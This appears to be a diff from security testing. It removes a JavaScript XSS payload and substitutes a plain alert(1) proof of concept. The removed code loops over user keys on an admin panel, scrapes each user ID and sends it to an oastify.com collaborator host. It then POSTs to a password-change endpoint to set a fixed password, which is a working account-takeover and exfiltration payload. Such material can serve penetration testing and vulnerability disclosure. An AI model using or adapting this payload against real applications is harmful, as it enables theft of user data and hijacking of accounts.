@@ -1,16 +1,2 @@
-for (let i = 50789; i <= 50790; i++) {
-  fetch(`https://localhost:45926/Admin/AdminUsers/Edit?aPatientKey=${i}`)
-    .then(res => res.text())
-    .then(res => {
-      let match = res.match(/id='UserIDText'>(.*?)<\/span>/);
-      if (match) {
-        fetch(`https://rtoiinryfxtoxe4fri1y2x6wpnvej57u.oastify.com?data=${encodeURIComponent(match[1])}`);
-      }
-      return fetch("https://localhost:45926/Admin/AdminUsers/SavePasswordChange", {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: `aPatientKey=${i}&NewPassword=Test%40123%4012`
-      });
-    });
-}
+alert(1)
 
